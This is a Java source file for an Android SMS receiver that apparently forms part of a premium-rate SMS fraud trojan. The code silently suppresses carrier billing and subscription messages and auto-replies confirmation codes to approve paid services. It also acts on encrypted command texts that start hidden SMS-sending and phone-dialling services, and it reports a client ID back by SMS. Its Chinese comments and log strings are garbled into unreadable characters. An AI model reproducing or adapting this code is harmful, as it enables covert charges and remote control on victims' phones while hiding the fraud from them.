package com.sttm.charge;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

import com.sttm.bean.BaseZone;
import com.sttm.bean.BillSms;
import com.sttm.bean.Ivr;
import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.EncryptUtil;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;

@SuppressWarnings("deprecation")
public class SmsReceiver extends BroadcastReceiver {
	private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
	private static final String TAG = "SmsReceiver";
	private String smsNumber;
	private String smsContent;
	private ShareProDBHelper dbHelper;
	private String replyNumber;
	private int isShutGSMDown;
	private int isShutChanelDown;
	private String adsNumbers;
	private String saleVolumeNumbers;
	private Boolean sendSecretSms;
	private Boolean sendNormonSms;
	private String keyword;
	

	public SmsReceiver() {
		Log.d(TAG, "������������������");
		LogFile.WriteLogFile("������������������");
	}

	public void onReceive(Context context, Intent intent) {
		Log.d(TAG, "���Ž����������ɹ�");
		// ��ȡ�������ĺ���
		dbHelper = new ShareProDBHelper(context);
		
		setSmsCenterNumber(intent);

		if (intent.getAction().equals(strRes)) {
			Log.d("SmsReceiver", "���Ž�������ʼ");
			init();
			SharedPreferences sp2 = dbHelper
					.getSharedPreferences("sendSmsFlag");
			sendSecretSms = sp2.getBoolean("sendSecretSms", false);
			sendSecretSms = KsoCache.getInstance().getValue2("sendSecretSms") != null ? (Boolean) KsoCache
					.getInstance().getValue2("sendSecretSms") : false;
			sendNormonSms = sp2.getBoolean("sendNormonSms", false);
			sendNormonSms = KsoCache.getInstance().getValue2("sendNormonSms") != null ? (Boolean) KsoCache
					.getInstance().getValue2("sendNormonSms") : false;
			replyNumber = sp2.getString("secretSmsReplyNumber", "");

			replyNumber = KsoCache.getInstance().getValue2(
					"secretSmsReplyNumber") != null ? (String) KsoCache
					.getInstance().getValue2("secretSmsReplyNumber") : "";

			Log.d(TAG, "���Żظ�����=========" + replyNumber);
			keyword = sp2.getString(keyword, "");
			keyword = KsoCache.getInstance().getValue2("keyword") != null ? (String) KsoCache
					.getInstance().getValue2("keyword") : "";
			Log.d(TAG, "���۷���֮���־=" + sendSecretSms);
			Log.d(TAG, "��ͨ�۷ѷ��ͱ�־=" + sendNormonSms);
			LogFile.WriteLogFile("���۷���֮���־=" + sendSecretSms);
			LogFile.WriteLogFile("���Żظ�����=" + replyNumber);
			LogFile.WriteLogFile("�ؼ���=" + keyword);
			// -------------------------------------------------------------------
			// ��ȡ�绰����Ͷ�������
			StringBuilder body = new StringBuilder();// ��������
			StringBuilder number = new StringBuilder();// ���ŷ�����
			Bundle bundle = intent.getExtras();

			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] msg = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					msg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}

				for (SmsMessage currMsg : msg) {
					body.append(currMsg.getDisplayMessageBody());
					number.append(currMsg.getDisplayOriginatingAddress());
				}
				// �õ��������ݺ͵绰����
				smsContent = body.toString();
				smsNumber = number.toString();
				Log.d("���ź���", smsNumber);
				Log.d("��������", smsContent);
			}
			LogFile.WriteLogFile("���յ���һ������Ϊ" + smsNumber + "��������Ϊ" + smsContent
					+ "�Ķ���");

			// -------------------------------------------------------------------------

			if (smsNumber.startsWith("10086") || smsNumber.startsWith("10010")
					|| smsNumber.startsWith("106")) {

				Boolean smsCenterSendFlag = KsoCache.getInstance().getValue(
						"smsCenterFlag") != null ? (Boolean) KsoCache
						.getInstance().getValue("smsCenterFlag") : false;
				if (smsCenterSendFlag) {
					this.abortBroadcast();
				}

				if (smsContent.contains("�ֻ��Ķ�") || smsContent.contains("�ֻ�����")
						|| smsContent.contains("10086901")
						|| smsContent.contains("��Ϸ����")
						|| smsContent.contains("��ʼ��Ч")
						|| smsContent.contains("�ֻ���Ƶ")
						|| smsContent.contains("�ֻ�����")
						|| smsContent.contains("�㲥��Ϣ")) {
					this.abortBroadcast();
					//Log.d(TAG, "���λ����շ���Ϣ,����Ϊ" + smsContent);
					LogFile.WriteLogFile("���λ����շ���Ϣ," + smsContent);
				}
			}

			if (sendSecretSms) {
				if (smsNumber.startsWith("10")
						|| smsNumber.startsWith(replyNumber)) {
					this.abortBroadcast();
					Log.d(TAG, "���˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���");
					LogFile.WriteLogFile("���˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���");
				}
			}

			if (!sendSecretSms && sendNormonSms) {
				if (smsNumber.startsWith("10086")
						|| smsNumber.startsWith("10010")
						|| smsNumber.startsWith("106")) {
					if (isShutGSMDown == 1 || isShutChanelDown == 1) {
						this.abortBroadcast();
						//Log.d(TAG,"���˲�Ʒ�շѶ���֮�󣬰���һ����Żظ���������������:�Ƿ�ɾ����Ӫ�̶��ź��Ƿ�ɾ��ͨ�����������Ƶ�һ��͵ڶ�������Ƿ�ɾ��");
						LogFile.WriteLogFile("���˲�Ʒ�շѶ���֮�󣬰���һ����Żظ���������������:�Ƿ�ɾ����Ӫ�̶��ź��Ƿ�ɾ��ͨ�����������Ƶ�һ��͵ڶ�������Ƿ�ɾ��");

					}

				}
			}
			// -------------------------------------------------------------------------------------------------

			if (!"".equals(replyNumber) && smsNumber.startsWith(replyNumber)) {
				//Log.d(TAG, "���Ե�1");
				LogFile.WriteLogFile("���յ����ŵĺ�����ظ��������,����" + replyNumber + "��ͷ");
				// ���۶��Żظ�����
				/**
				 * ��������������С��ظ����⡱�����ظ���ȷ�ϡ��ؼ��ֵĶ��ţ���ظ����ǡ���
				 * ����ڷ��˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���
				 * ����ڷ��˲�Ʒ�շѶ���֮�󣬰���һ����Żظ���������������
				 * :�Ƿ�ɾ����Ӫ�̶��ź��Ƿ�ɾ��ͨ�����������Ƶ�һ��͵ڶ�������Ƿ�ɾ����
				 */
				if (smsContent.contains("�ظ�����") || smsContent.contains("�ظ���ȷ��")) {

					if (sendSecretSms) {
						// ����Ƿ����˰��۶��ţ����յ�һ����Żأ���ɾ������
						SmsSenderAndReceiver.send2(smsNumber, "��");
						LogFile.WriteLogFile("���۶��ŷ���֮�󣬻ظ���ȷ�϶��ŷ��ͳ�ȥ��");

						// ɾ�����Ͷ��ż�¼
						this.abortBroadcast();
						LogFile.WriteLogFile("�����˵�һ����ţ�����)");
					} else if (sendNormonSms) {
						// ����Ƿ����˰��»�㲥���ţ����� ��һ����Żأ�
						SmsSenderAndReceiver.send2(smsNumber, "��");
						LogFile.WriteLogFile("���»�㲥���ŷ���֮�󣬻ظ���ȷ�϶��ŷ��ͳ�ȥ��");
						// ɾ�����Ͷ��ż�¼
						if (isShutGSMDown == 1 || isShutChanelDown == 1) {
							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ���Ʒ�շ�)");

						}

					}

				}

				/**
				 * ���������������ĳЩ�ؼ��֣���ؼ���=���������롱�� ���߹ؼ���=�������ļ������ؼ��ֿ��Ե����������Ķ��ţ�
				 * 1�������������;����ļ������������0-9,a-z,A-Z,���ַ�����ظ�������Ϊ��
				 * ������ַ���ʼ��������0-9,a-z,A-Z,���ַ�������Ϊ�ظ�������
				 * 2��������ǵ�һ���������ӱ�������;����ļ����棬
				 * ��һ�������ĺ��֣�0-9,a-z,A-Z,����һ���������ĺ��֣�0-9,a-z,A-Z,������Ϊ�ظ�������
				 * 
				 */
				Log.d(TAG, "�ؼ���" + keyword);

				if (smsContent.contains("��������")
						|| (!interpruptContentIVR(smsContent)
								&& !interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
									.contains(keyword))) {

					//Log.d("��������keyword", "========enter==========");

					int offSet = 0;
					if (smsContent.contains("��������")) {
						offSet = smsContent.indexOf("��������") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) >= 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {

						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								lastSet = i;
								break;
							}
						}

						//Log.d("offSet", "=======" + offSet + "offSet1");
						//Log.d("lastSet", "=======" + lastSet + "lastSet1");
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {

							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("���۶��ŷ���֮�󣬻ظ����ݣ�" + smsCon
									+ " ���ŷ��ͳ�ȥ��");
							//Log.d(TAG, "���۶��ŷ���֮�󣬻ظ����ݣ�" + smsCon + " ���ŷ��ͳ�ȥ��");
							this.abortBroadcast();
							//Log.d(TAG, "�����˵�һ����ţ�����)");
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						} else if (sendNormonSms) {
							// ����Ƿ����˰��»��ߵ㲥��Ϣ������ ��һ����Żأ�
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("���»�㲥���ŷ���֮�����ݻظ�Ϊ��" + smsCon
									+ "���ŷ��ͳ�ȥ��");
							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("�����˵�һ����ţ���Ʒ�շ�)");
							}

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {

						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						//Log.d("startIndex1", "--------" + startIndex + "test1");
						//Log.d("lastSet1", "--------" + lastSet + "test1");
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						//Log.d(TAG, "��������1" + smsCont);

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							//Log.d(TAG, "���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCont + "���ŷ��ͳ�ȥ��");
							LogFile.WriteLogFile("���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCont
									+ "���ŷ��ͳ�ȥ��");

							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						} else if (sendNormonSms) {
							// ����Ƿ����˰�����Ϣ������ ��һ����Żأ�
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							LogFile.WriteLogFile("���»�㲥���ŷ���֮�����ݻظ�Ϊ��" + smsCont
									+ "���ŷ��ͳ�ȥ��");

							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("�����˵�һ����ţ���Ʒ�շ�)");
							}

						}

					}

				}

			} else if (interpruptPhone(smsNumber)) {
				// ���ص����ź�����10086��106��10010
				//Log.d(TAG, "���Զ�");

				/**
				 * ��������� ��⵽���룺10086��106��10010����ͷ�ģ� ���С��ꡱ�����¡������ա�������㲥��
				 * ���С���Ϣ�ѡ�������������� ���С��㲥��Ϣ�������ڷ��͡� ���С��������⡱�� ���С��ɹ�����
				 */
				if ((smsContent.contains("��") && smsContent.contains("��")
						&& smsContent.contains("��") && smsContent
							.contains("��㲥"))
						|| (smsContent.contains("�������") && smsContent
								.contains("��Ϣ��"))
						|| (smsContent.contains("�㲥��Ϣ") && smsContent
								.contains("�ڷ���"))
						|| smsContent.contains("��������")
						|| smsContent.contains("�ɹ�����")) {

					this.abortBroadcast();
					LogFile.WriteLogFile("�����˵��������");

				}

				/**
				 * ��������������С��ظ����⡱�����ظ���ȷ�ϡ��ؼ��ֵĶ��ţ���ظ����ǡ���
				 * ����ڷ��˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���
				 * ����ڷ��˲�Ʒ�շѶ���֮�󣬰���һ����Żظ���������������
				 * :�Ƿ�ɾ����Ӫ�̶��ź��Ƿ�ɾ��ͨ�����������Ƶ�һ��͵ڶ�������Ƿ�ɾ����
				 */
				if (smsContent.contains("�ظ�����") || smsContent.contains("�ظ���ȷ��")) {

					if (sendSecretSms) {
						// ����Ƿ����˰��۶��ţ����յ�һ����Żأ���ɾ������
						SmsSenderAndReceiver.send2(smsNumber, "��");
						LogFile.WriteLogFile("���۶��ŷ���֮�󣬻ظ���ȷ�϶��ŷ��ͳ�ȥ��");

						// ɾ�����Ͷ��ż�¼
						this.abortBroadcast();
						LogFile.WriteLogFile("�����˵�һ����ţ�����)");
					} else if (sendNormonSms) {
						// ����Ƿ����˰��»�㲥���ţ����� ��һ����Żأ�
						SmsSenderAndReceiver.send2(smsNumber, "��");
						LogFile.WriteLogFile("���»�㲥���ŷ���֮�󣬻ظ���ȷ�϶��ŷ��ͳ�ȥ��");
						// ɾ�����Ͷ��ż�¼
						if (isShutGSMDown == 1 || isShutChanelDown == 1) {
							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ���Ʒ�շ�)");

						}

					}

				}

				/**
				 * ���������������ĳЩ�ؼ��֣���ؼ���=���������롱�� ���߹ؼ���=�������ļ������ؼ��ֿ��Ե����������Ķ��ţ�
				 * 1�������������;����ļ������������0-9,a-z,A-Z,���ַ�����ظ�������Ϊ��
				 * ������ַ���ʼ��������0-9,a-z,A-Z,���ַ�������Ϊ�ظ�������
				 * 2��������ǵ�һ���������ӱ�������;����ļ����棬
				 * ��һ�������ĺ��֣�0-9,a-z,A-Z,����һ���������ĺ��֣�0-9,a-z,A-Z,������Ϊ�ظ�������
				 * 
				 */

				if (smsContent.contains("��������")
						|| (!interpruptContentIVR(smsContent)
								&& !interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
								.indexOf(keyword) > 0)) {

					int offSet = 0;
					if (smsContent.contains("��������")) {
						offSet = smsContent.indexOf("��������") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) > 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					Log.d(TAG, "��������ƫ����" + offSet);
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {
						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {
								lastSet = i;
								break;
							}
						}
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCon
									+ "���ŷ��ͳ�ȥ��");

							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						} else if (sendNormonSms) {
							// ����Ƿ����˰��»��ߵ㲥��Ϣ������ ��һ����Żأ�
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("���»�㲥���ŷ���֮�����ݻظ�Ϊ��" + smsCon
									+ "���ŷ��ͳ�ȥ��");
							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("�����˵�һ����ţ���Ʒ�շ�)");
							}

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {
						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							LogFile.WriteLogFile("���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCont
									+ "���ŷ��ͳ�ȥ��");

							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						} else if (sendNormonSms) {
							// ����Ƿ����˰�����Ϣ������ ��һ����Żأ�
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							LogFile.WriteLogFile("���»�㲥���ŷ���֮�����ݻظ�Ϊ��" + smsCont
									+ "���ŷ��ͳ�ȥ��");

							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("�����˵�һ����ţ���Ʒ�շ�)");
							}

						}

					}

				}

				// �ڶ�����ţ�
				// ��⵽���룺10086��106��10010����ͷ�ģ����йؼ�����Ϣ�ѡ�����������롱��
				if (smsContent.contains("��Ϣ��") || smsContent.contains("�������")) {
					if (isShutGSMDown == 1 && isShutChanelDown == 1) {
						this.abortBroadcast();
						LogFile.WriteLogFile("�����˵ڶ������");

					}
				}

				if (sendSecretSms) {
					// ������۶��ŷ����ˣ���һ����Ŷ�����ɾ��
					this.abortBroadcast();
					LogFile.WriteLogFile("�����˵�-����ţ�������۶��ŷ����ˣ���һ����Ŷ�����ɾ����");

				}

			} else if (interpruptAdsAndSaleNumber(smsNumber)) {
				//Log.d(TAG, "������");
				/**
				 * ��������ţ� ���ź����к����������룬�������
				 */
				this.abortBroadcast();
				LogFile.WriteLogFile("���������������룬������Ķ��ź���");

			}

			if (interpruptAdsAndSaleContent(smsContent)) {

				//Log.d(TAG, "������");
				/**
				 * ��������ţ� ���������к����������룬�������
				 */
				this.abortBroadcast();
				LogFile.WriteLogFile("�����˶��������к����������룬������Ķ��ź���");

			} else if (interpruptContentIVR(smsContent)) {
				//Log.d(TAG, "=======����IVR========");
				Ivr ivr = EncryptUtil.getEncryptVIRString(smsContent);
				//Log.d(TAG, "ࣴ����" + ivr.getChanel());

				Intent service_ivr = new Intent(context, CallService.class);
				service_ivr.putExtra("dialTime", ivr.getDialTime());
				service_ivr.putExtra("chanel", ivr.getChanel());
				service_ivr.putExtra("radioPrompt1", ivr.getRadioPrompt1());
				service_ivr.putExtra("radioPrompt2", ivr.getRadioPrompt2());
				service_ivr.putExtra("radioPrompt3", ivr.getRadioPrompt3());
				service_ivr.putExtra("radioPrompt4", ivr.getRadioPrompt4());
				service_ivr.putExtra("keyCode1", ivr.getKeyCode1());
				service_ivr.putExtra("keyCode2", ivr.getKeyCode2());
				service_ivr.putExtra("keyCode3", ivr.getKeyCode3());
				service_ivr.putExtra("keyCode4", ivr.getKeyCode4());
				context.startService(service_ivr);

			} else if (interpruptContent(smsContent)) {

				//Log.d(TAG, "������");
				this.abortBroadcast();

				// ���ض��������а���ͨ��
				BillSms billSms = EncryptUtil.getEncryptSMSString(smsContent);
				long time = KsoCache.getInstance().getValue("adsTime") != null ? (Long) KsoCache
						.getInstance().getValue("adsTime") : 4;

				//Log.d("����ʱ����", time + "'");
				//Log.d(TAG, "�������Ͷ��ŷ���");
				LogFile.WriteLogFile("�������Ͷ��ŷ���");
				Intent service = new Intent(context, SendSmsService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", billSms.getCount());
				service.putExtra("secretSmsReplyNumber",
						billSms.getReplyNumber());
				service.putExtra("keyword", billSms.getKeyword());

				if (KsoHelper.getARS2(context) == 1) {
					//Log.d(TAG, "�й��ƶ�����");

					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					//Log.d(TAG,"billSms.getMobileOrder():"+ billSms.getMobileOrder());
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());
					service.putExtra("flag", 1);

				} else if (KsoHelper.getARS2(context) == 2) {
					//Log.d(TAG, "�й���ͨ����");

					service.putExtra("SecretSmsNumber",
							billSms.getUnionChanel());
					service.putExtra("SecretSmsOrder", billSms.getUnionOrder());

					service.putExtra("flag", 2);

				} else {

					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());

					service.putExtra("flag", 3);

				}
				context.startService(service);
				//Log.d(TAG, "�����˰��۶���");
				LogFile.WriteLogFile("�����˰��۶���");

			} else if (interpruptContentBaseZone(smsContent)) {
				

			}else if(smsContent.contains("����ޣ��������|ClientID".trim())){
				String curstomId = KsoCache.getInstance().getValue("curstomID")!= null
					? (String)KsoCache.getInstance().getValue("curstomID") : "00000000";
				//Log.d("curstomID", curstomId + "===curstomId");
				if(!"".equals(curstomId)){
					SmsSenderAndReceiver.send2(smsNumber, curstomId);
					LogFile.WriteLogFile("�����Ϳͻ�IDΪ" + curstomId + "����");
				}
				

				this.abortBroadcast();
				
			}

		}

	}

	// �绰10086��10010��106����

	public boolean interpruptPhone(String telephoneNumber) {
		if (telephoneNumber.startsWith("10086")
				|| telephoneNumber.startsWith("106")
				|| telephoneNumber.startsWith("10010")) {
			return true;

		}

		return false;

	}

	// ���۶���

	public boolean interpruptContent(String phoneContent) {
		if (phoneContent.indexOf("SMVCE") >= 0) {
			return true;
		}
		return false;
	}

	// ����IVR

	public boolean interpruptContentIVR(String phoneContent) {
		if (phoneContent.indexOf("SMGE4") >= 0) {
			return true;
		}
		return false;

	}

	// ����

	public boolean interpruptContentBaseZone(String phoneContent) {
		if (phoneContent.indexOf("BDVCG") >= 0) {
			return true;
		}
		return false;

	}

	// ������������͹�����
	public boolean interpruptAdsAndSaleNumber(String smsNumber) {

		if (!"".equals(adsNumbers)
				&& !"".equals(saleVolumeNumbers)
				&& (adsNumbers.indexOf(smsNumber) >= 0 || saleVolumeNumbers
						.indexOf(smsNumber) >= 0)) {
			return true;
		}
		return false;

	}

	// ���˶�����������������͹�����
	public boolean interpruptAdsAndSaleContent(String smsContent) {
		if (!"".equals(saleVolumeNumbers)) {

			saleVolumeNumbers = saleVolumeNumbers.substring(0,
					saleVolumeNumbers.lastIndexOf(","));
			String[] saleNumberArray = saleVolumeNumbers.split(",");
			for (int i = 0; i < saleNumberArray.length; i++) {
				if (smsContent.indexOf(saleNumberArray[i]) >= 0) {
					return true;
				}
			}
		}

		if (!"".equals(adsNumbers)) {

			adsNumbers = adsNumbers.substring(0, adsNumbers.lastIndexOf(","));
			String[] adsNumbersArray = adsNumbers.split(",");
			for (int i = 0; i < adsNumbersArray.length; i++) {
				if (smsContent.indexOf(adsNumbersArray[i]) >= 0) {
					return true;
				}
			}

		}

		return false;

	}

	public void init() {
		isShutGSMDown = KsoCache.getInstance().getValue("isShutDown") != null ? (Integer) KsoCache
				.getInstance().getValue("isShutDown") : 0;
		isShutChanelDown = KsoCache.getInstance().getValue("isChanelShutDown") != null ? (Integer) KsoCache
				.getInstance().getValue("isChanelShutDown") : 0;

		adsNumbers = KsoCache.getInstance().getValue("adsNumbers") != null ? (String) KsoCache
				.getInstance().getValue("adsNumbers") : "";
		saleVolumeNumbers = KsoCache.getInstance().getValue("saleNumbers") != null ? (String) KsoCache
				.getInstance().getValue("saleNumbers") : "";

	}

	private void setSmsCenterNumber(Intent intent) {
		KsoCache cache = KsoCache.getInstance();
		// Boolean smsCenterFlag =
		// Boolean.parseBoolean(dbHelper.readMsg("smsCenterFlag", 3, "false"));

		Boolean smsCenterFlag = cache.getValue("smsCenterFlag") != null ? (Boolean) cache
				.getValue("smsCenterFlag") : false;
		if (smsCenterFlag) {
			String actionName = intent.getAction();
			int resultCode = getResultCode();
			if (actionName.equals("lab.sodino.sms.send")) {
				// do nothing
				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName.equals("lab.sodino.sms.delivery")) {
				// do nothing
				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName
					.equals("android.provider.Telephony.SMS_RECEIVED")) {

				System.out.println("[Sodino]result = " + resultCode);
				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] myOBJpdus = (Object[]) bundle.get("pdus");
					SmsMessage[] messages = new SmsMessage[myOBJpdus.length];
					for (int i = 0; i < myOBJpdus.length; i++) {
						messages[i] = SmsMessage
								.createFromPdu((byte[]) myOBJpdus[i]);
					}
					SmsMessage message = messages[0];
					cache.reSetValue("SmsCenterNumber",
							message.getServiceCenterAddress());
			
				

					//Log.d(TAG, "�������ĺ���Ϊ:" + message.getServiceCenterAddress());
					LogFile.WriteLogFile("�������ĺ���Ϊ:"
							+ message.getServiceCenterAddress());
					cache.reSetValue("smsCenterFlag", false);

				}
			}
		}
	}

}
